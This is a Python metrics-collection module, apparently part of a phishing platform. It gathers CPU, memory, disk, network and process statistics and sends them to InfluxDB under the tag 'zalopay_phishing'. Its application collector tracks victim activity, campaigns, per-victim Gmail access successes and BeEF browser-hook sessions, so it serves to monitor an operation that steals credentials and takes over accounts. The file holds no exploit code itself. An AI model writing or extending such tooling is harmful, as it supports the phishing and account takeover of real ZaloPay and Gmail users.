"""
Metrics Collector
Collects and records system and application metrics
"""

import asyncio
import psutil
import time
from datetime import datetime, timezone
from typing import Dict, Any, List
import logging

from .influxdb_client import record_metric, get_influxdb_client
from .structured_logging import get_logger

logger = get_logger(__name__)

class SystemMetricsCollector:
    """
    Collects system-level metrics
    """
    
    def __init__(self):
        self.last_cpu_times = None
        self.last_disk_io = None
        self.last_network_io = None
    
    async def collect_cpu_metrics(self) -> Dict[str, Any]:
        """
        Collect CPU metrics
        
        Returns:
            Dictionary of CPU metrics
        """
        try:
            # CPU usage percentage
            cpu_percent = psutil.cpu_percent(interval=1)
            
            # CPU times
            cpu_times = psutil.cpu_times()
            
            # CPU count
            cpu_count = psutil.cpu_count()
            
            # Load average (Unix only)
            try:
                load_avg = psutil.getloadavg()
            except AttributeError:
                load_avg = (0, 0, 0)
            
            metrics = {
                'usage_percent': cpu_percent,
                'user_time': cpu_times.user,
                'system_time': cpu_times.system,
                'idle_time': cpu_times.idle,
                'iowait_time': getattr(cpu_times, 'iowait', 0),
                'irq_time': getattr(cpu_times, 'irq', 0),
                'softirq_time': getattr(cpu_times, 'softirq', 0),
                'cpu_count': cpu_count,
                'load_avg_1m': load_avg[0],
                'load_avg_5m': load_avg[1],
                'load_avg_15m': load_avg[2]
            }
            
            return metrics
            
        except Exception as e:
            logger.error(f"Error collecting CPU metrics: {e}")
            return {}
    
    async def collect_memory_metrics(self) -> Dict[str, Any]:
        """
        Collect memory metrics
        
        Returns:
            Dictionary of memory metrics
        """
        try:
            # Virtual memory
            virtual_memory = psutil.virtual_memory()
            
            # Swap memory
            swap_memory = psutil.swap_memory()
            
            metrics = {
                'total': virtual_memory.total,
                'available': virtual_memory.available,
                'used': virtual_memory.used,
                'free': virtual_memory.free,
                'usage_percent': virtual_memory.percent,
                'swap_total': swap_memory.total,
                'swap_used': swap_memory.used,
                'swap_free': swap_memory.free,
                'swap_usage_percent': swap_memory.percent
            }
            
            return metrics
            
        except Exception as e:
            logger.error(f"Error collecting memory metrics: {e}")
            return {}
    
    async def collect_disk_metrics(self) -> Dict[str, Any]:
        """
        Collect disk metrics
        
        Returns:
            Dictionary of disk metrics
        """
        try:
            metrics = {}
            
            # Disk usage
            disk_usage = psutil.disk_usage('/')
            metrics.update({
                'total': disk_usage.total,
                'used': disk_usage.used,
                'free': disk_usage.free,
                'usage_percent': (disk_usage.used / disk_usage.total) * 100
            })
            
            # Disk I/O
            disk_io = psutil.disk_io_counters()
            if disk_io:
                if self.last_disk_io:
                    # Calculate rates
                    time_diff = time.time() - self.last_disk_io['timestamp']
                    read_rate = (disk_io.read_bytes - self.last_disk_io['read_bytes']) / time_diff
                    write_rate = (disk_io.write_bytes - self.last_disk_io['write_bytes']) / time_diff
                    
                    metrics.update({
                        'read_rate': read_rate,
                        'write_rate': write_rate,
                        'read_ops_rate': (disk_io.read_count - self.last_disk_io['read_count']) / time_diff,
                        'write_ops_rate': (disk_io.write_count - self.last_disk_io['write_count']) / time_diff
                    })
                
                # Store current values for next calculation
                self.last_disk_io = {
                    'timestamp': time.time(),
                    'read_bytes': disk_io.read_bytes,
                    'write_bytes': disk_io.write_bytes,
                    'read_count': disk_io.read_count,
                    'write_count': disk_io.write_count
                }
            
            return metrics
            
        except Exception as e:
            logger.error(f"Error collecting disk metrics: {e}")
            return {}
    
    async def collect_network_metrics(self) -> Dict[str, Any]:
        """
        Collect network metrics
        
        Returns:
            Dictionary of network metrics
        """
        try:
            metrics = {}
            
            # Network I/O
            network_io = psutil.net_io_counters()
            if network_io:
                if self.last_network_io:
                    # Calculate rates
                    time_diff = time.time() - self.last_network_io['timestamp']
                    bytes_sent_rate = (network_io.bytes_sent - self.last_network_io['bytes_sent']) / time_diff
                    bytes_recv_rate = (network_io.bytes_recv - self.last_network_io['bytes_recv']) / time_diff
                    
                    metrics.update({
                        'bytes_sent_rate': bytes_sent_rate,
                        'bytes_recv_rate': bytes_recv_rate,
                        'packets_sent_rate': (network_io.packets_sent - self.last_network_io['packets_sent']) / time_diff,
                        'packets_recv_rate': (network_io.packets_recv - self.last_network_io['packets_recv']) / time_diff,
                        'errin_rate': (network_io.errin - self.last_network_io['errin']) / time_diff,
                        'errout_rate': (network_io.errout - self.last_network_io['errout']) / time_diff,
                        'dropin_rate': (network_io.dropin - self.last_network_io['dropin']) / time_diff,
                        'dropout_rate': (network_io.dropout - self.last_network_io['dropout']) / time_diff
                    })
                
                # Store current values for next calculation
                self.last_network_io = {
                    'timestamp': time.time(),
                    'bytes_sent': network_io.bytes_sent,
                    'bytes_recv': network_io.bytes_recv,
                    'packets_sent': network_io.packets_sent,
                    'packets_recv': network_io.packets_recv,
                    'errin': network_io.errin,
                    'errout': network_io.errout,
                    'dropin': network_io.dropin,
                    'dropout': network_io.dropout
                }
            
            return metrics
            
        except Exception as e:
            logger.error(f"Error collecting network metrics: {e}")
            return {}
    
    async def collect_process_metrics(self) -> Dict[str, Any]:
        """
        Collect process metrics
        
        Returns:
            Dictionary of process metrics
        """
        try:
            # Process count
            process_count = len(psutil.pids())
            
            # Current process
            current_process = psutil.Process()
            
            metrics = {
                'total_processes': process_count,
                'current_process_cpu_percent': current_process.cpu_percent(),
                'current_process_memory_percent': current_process.memory_percent(),
                'current_process_memory_rss': current_process.memory_info().rss,
                'current_process_memory_vms': current_process.memory_info().vms,
                'current_process_num_threads': current_process.num_threads(),
                'current_process_num_fds': getattr(current_process, 'num_fds', 0),
                'current_process_create_time': current_process.create_time()
            }
            
            return metrics
            
        except Exception as e:
            logger.error(f"Error collecting process metrics: {e}")
            return {}

class ApplicationMetricsCollector:
    """
    Collects application-level metrics
    """
    
    def __init__(self):
        self.request_count = 0
        self.error_count = 0
        self.response_times = []
        self.active_connections = 0
        self.victim_count = 0
        self.campaign_count = 0
        self.gmail_access_count = 0
        self.beef_session_count = 0
    
    def record_request(self, method: str, path: str, status_code: int, response_time: float):
        """
        Record HTTP request metrics
        
        Args:
            method: HTTP method
            path: Request path
            status_code: Response status code
            response_time: Response time in seconds
        """
        self.request_count += 1
        
        if status_code >= 400:
            self.error_count += 1
        
        self.response_times.append(response_time)
        
        # Keep only last 1000 response times
        if len(self.response_times) > 1000:
            self.response_times = self.response_times[-1000:]
    
    def record_connection(self, connected: bool):
        """
        Record connection metrics
        
        Args:
            connected: True if connection established, False if disconnected
        """
        if connected:
            self.active_connections += 1
        else:
            self.active_connections = max(0, self.active_connections - 1)
    
    def record_victim_activity(self, victim_id: str, activity: str):
        """
        Record victim activity
        
        Args:
            victim_id: Victim ID
            activity: Activity type
        """
        self.victim_count += 1
    
    def record_campaign_activity(self, campaign_id: str, activity: str):
        """
        Record campaign activity
        
        Args:
            campaign_id: Campaign ID
            activity: Activity type
        """
        self.campaign_count += 1
    
    def record_gmail_access(self, victim_id: str, success: bool):
        """
        Record Gmail access
        
        Args:
            victim_id: Victim ID
            success: Whether access was successful
        """
        self.gmail_access_count += 1
    
    def record_beef_session(self, victim_id: str, session_id: str):
        """
        Record BeEF session
        
        Args:
            victim_id: Victim ID
            session_id: BeEF session ID
        """
        self.beef_session_count += 1
    
    async def get_metrics(self) -> Dict[str, Any]:
        """
        Get current application metrics
        
        Returns:
            Dictionary of application metrics
        """
        avg_response_time = sum(self.response_times) / len(self.response_times) if self.response_times else 0
        error_rate = (self.error_count / self.request_count * 100) if self.request_count > 0 else 0
        
        return {
            'request_count': self.request_count,
            'error_count': self.error_count,
            'error_rate': error_rate,
            'avg_response_time': avg_response_time,
            'active_connections': self.active_connections,
            'victim_count': self.victim_count,
            'campaign_count': self.campaign_count,
            'gmail_access_count': self.gmail_access_count,
            'beef_session_count': self.beef_session_count
        }

class SecurityMetricsCollector:
    """
    Collects security-related metrics
    """
    
    def __init__(self):
        self.failed_logins = 0
        self.suspicious_activities = 0
        self.blocked_ips = 0
        self.security_events = []
    
    def record_failed_login(self, ip_address: str, username: str):
        """
        Record failed login attempt
        
        Args:
            ip_address: IP address
            username: Username
        """
        self.failed_logins += 1
        self.security_events.append({
            'type': 'failed_login',
            'ip_address': ip_address,
            'username': username,
            'timestamp': datetime.now(timezone.utc)
        })
    
    def record_suspicious_activity(self, activity_type: str, details: Dict[str, Any]):
        """
        Record suspicious activity
        
        Args:
            activity_type: Type of suspicious activity
            details: Activity details
        """
        self.suspicious_activities += 1
        self.security_events.append({
            'type': 'suspicious_activity',
            'activity_type': activity_type,
            'details': details,
            'timestamp': datetime.now(timezone.utc)
        })
    
    def record_blocked_ip(self, ip_address: str, reason: str):
        """
        Record blocked IP
        
        Args:
            ip_address: IP address
            reason: Block reason
        """
        self.blocked_ips += 1
        self.security_events.append({
            'type': 'blocked_ip',
            'ip_address': ip_address,
            'reason': reason,
            'timestamp': datetime.now(timezone.utc)
        })
    
    async def get_metrics(self) -> Dict[str, Any]:
        """
        Get current security metrics
        
        Returns:
            Dictionary of security metrics
        """
        return {
            'failed_logins': self.failed_logins,
            'suspicious_activities': self.suspicious_activities,
            'blocked_ips': self.blocked_ips,
            'security_events_count': len(self.security_events)
        }

class MetricsCollector:
    """
    Main metrics collector that coordinates all metric collection
    """
    
    def __init__(self):
        self.system_collector = SystemMetricsCollector()
        self.application_collector = ApplicationMetricsCollector()
        self.security_collector = SecurityMetricsCollector()
        self.running = False
        self.collection_interval = 60  # seconds
    
    async def start(self):
        """Start metrics collection"""
        self.running = True
        logger.info("Starting metrics collection")
        
        while self.running:
            try:
                await self.collect_all_metrics()
                await asyncio.sleep(self.collection_interval)
            except Exception as e:
                logger.error(f"Error in metrics collection: {e}")
                await asyncio.sleep(self.collection_interval)
    
    async def stop(self):
        """Stop metrics collection"""
        self.running = False
        logger.info("Stopping metrics collection")
    
    async def collect_all_metrics(self):
        """Collect all metrics and send to InfluxDB"""
        try:
            # Collect system metrics
            await self.collect_system_metrics()
            
            # Collect application metrics
            await self.collect_application_metrics()
            
            # Collect security metrics
            await self.collect_security_metrics()
            
        except Exception as e:
            logger.error(f"Error collecting metrics: {e}")
    
    async def collect_system_metrics(self):
        """Collect and record system metrics"""
        try:
            # CPU metrics
            cpu_metrics = await self.system_collector.collect_cpu_metrics()
            if cpu_metrics:
                await record_metric(
                    measurement="system_cpu",
                    tags={"host": "zalopay_phishing"},
                    fields=cpu_metrics
                )
            
            # Memory metrics
            memory_metrics = await self.system_collector.collect_memory_metrics()
            if memory_metrics:
                await record_metric(
                    measurement="system_memory",
                    tags={"host": "zalopay_phishing"},
                    fields=memory_metrics
                )
            
            # Disk metrics
            disk_metrics = await self.system_collector.collect_disk_metrics()
            if disk_metrics:
                await record_metric(
                    measurement="system_disk",
                    tags={"host": "zalopay_phishing"},
                    fields=disk_metrics
                )
            
            # Network metrics
            network_metrics = await self.system_collector.collect_network_metrics()
            if network_metrics:
                await record_metric(
                    measurement="system_network",
                    tags={"host": "zalopay_phishing"},
                    fields=network_metrics
                )
            
            # Process metrics
            process_metrics = await self.system_collector.collect_process_metrics()
            if process_metrics:
                await record_metric(
                    measurement="system_process",
                    tags={"host": "zalopay_phishing"},
                    fields=process_metrics
                )
                
        except Exception as e:
            logger.error(f"Error collecting system metrics: {e}")
    
    async def collect_application_metrics(self):
        """Collect and record application metrics"""
        try:
            app_metrics = await self.application_collector.get_metrics()
            if app_metrics:
                await record_metric(
                    measurement="application",
                    tags={"service": "zalopay_phishing"},
                    fields=app_metrics
                )
                
        except Exception as e:
            logger.error(f"Error collecting application metrics: {e}")
    
    async def collect_security_metrics(self):
        """Collect and record security metrics"""
        try:
            security_metrics = await self.security_collector.get_metrics()
            if security_metrics:
                await record_metric(
                    measurement="security_events",
                    tags={"service": "zalopay_phishing"},
                    fields=security_metrics
                )
                
        except Exception as e:
            logger.error(f"Error collecting security metrics: {e}")
    
    def get_application_collector(self) -> ApplicationMetricsCollector:
        """Get application metrics collector"""
        return self.application_collector
    
    def get_security_collector(self) -> SecurityMetricsCollector:
        """Get security metrics collector"""
        return self.security_collector

# Global metrics collector instance
metrics_collector: MetricsCollector = None

def get_metrics_collector() -> MetricsCollector:
    """Get the global metrics collector instance"""
    global metrics_collector
    if metrics_collector is None:
        metrics_collector = MetricsCollector()
    return metrics_collector

async def start_metrics_collection():
    """Start metrics collection"""
    collector = get_metrics_collector()
    await collector.start()

async def stop_metrics_collection():
    """Stop metrics collection"""
    collector = get_metrics_collector()
    await collector.stop()

def record_request_metric(method: str, path: str, status_code: int, response_time: float):
    """Record HTTP request metric"""
    collector = get_metrics_collector()
    collector.get_application_collector().record_request(method, path, status_code, response_time)

def record_security_metric(event_type: str, **kwargs):
    """Record security metric"""
    collector = get_metrics_collector()
    security_collector = collector.get_security_collector()
    
    if event_type == 'failed_login':
        security_collector.record_failed_login(kwargs.get('ip_address', ''), kwargs.get('username', ''))
    elif event_type == 'suspicious_activity':
        security_collector.record_suspicious_activity(kwargs.get('activity_type', ''), kwargs.get('details', {}))
    elif event_type == 'blocked_ip':
        security_collector.record_blocked_ip(kwargs.get('ip_address', ''), kwargs.get('reason', ''))
